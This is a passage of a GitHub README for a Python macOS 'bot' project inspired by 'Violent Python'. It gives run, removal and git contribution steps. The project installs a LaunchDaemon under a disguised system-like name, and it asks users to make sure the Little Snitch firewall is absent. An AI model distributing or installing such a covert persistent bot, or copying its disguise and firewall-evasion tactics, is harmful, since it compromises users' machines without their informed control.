Download and run [Droplet.app](https://github.com/nikisweeting/python-medusa/raw/master/Droplet.app.zip)\r\n2. Make sure you're connected to the internet and don't have Little Snitch\r\n\r\n## Removal:\r\nIf you somehow got this bot unintentionally, please remove it, it's not meant to be a virus.\r\n\r\n1.

If you want to remove its runtime files and logs, run the following:\r\n\r\n```\r\nlaunchctl unload -w /Library/LaunchDaemons/sys.daemon.connectd.plist\r\nrm -Rf /var/softupdated\r\nrm /Library/LaunchDaemons/sys.daemon.connectd.plist\r\n```\r\n\r\n## Information:  \r\n  \r\nMany concepts and modules in this book are drawn from the book [\"Violent Python\"](http://books.google.com/books/about/Violent_Python.html?id=2XliiK7FKoEC).  \r\n\r\nThis project was started in March 2013, and is being worked on by several people.\r\nThis bot is for *good* not evil.  If you somehow got it, and want to get rid of it, please follow the removal instructions.\r\n    \r\n   \r\n===\r\n\r\n\r\nInstructions if you want to contribute:\r\n========\r\n## Install Dependencies:\r\n1. Install [Github.app](http://mac.github.com) for an easy GUI or `brew install git` for the CLI\r\n2. Pick a folder to store your code in\r\n3. Download the source to that folder:\r\n\r\n  ```\r\n  cd <folder here>\r\n  git clone https://github.com/nikisweeting/violent-python.git\r\n  cd violent-python\r\n  ```\r\nTo **run** and debug, do the following:\r\n  ```\r\n  sudo python bot.py &\r\n  tail -f bot_v*.log\r\n  ```\r\n\r\n## How to write Python\r\n  \r\n**How to edit:**  \r\n* Listen to badass music  \r\n* Pick a good editor like [Sublime Text 3](http://appdl.net/sublime-text-3-build-3021/)  \r\n* Save regularly  \r\n* Check to make sure your code works, by running it in terminal with `python bot.py &`   \r\n* There is awesome documentation on python all over the web: [http://www.python.org/doc/](http://www.python.org/doc/)  \r\n\r\n## How to use Git\r\n\r\nGit is a program that tracks the changes you make to code, then shares those changes you make with others.  A collection of code in one folder is called a \"repository\" (repo for short).  Groups of changes are put together to make a \"commit\".  You can view a history of all the commits made using `git log`.\r\n\r\n**Editing locally**   \r\n\r\n  1. Edit the code you want to edit, save it, test it, fix it, save it\r\n  2. go to terminal, cd to the the folder with our code, then run `git status` to see what you changed, alternatively, use the GUI Github.app downloadable from github.com \r\n  3. Make a commit of all your changes by running `git commit -a -m \"i did this, this, and this\"`  in the quotes is a short message describing changes you made so others can see  \r\n   \r\n**Sharing your edits**  \r\n  \r\n  After you've made all the commits you want, push them to the Github.com  \r\n  \r\n  1. `git remote update` to make sure your local code is up to date  \r\n  2. `git pull` to update your code if it isnt up to date  \r\n  3. `git push origin master` to push your code  \r\n","google":"","note":"Don't delete this file!
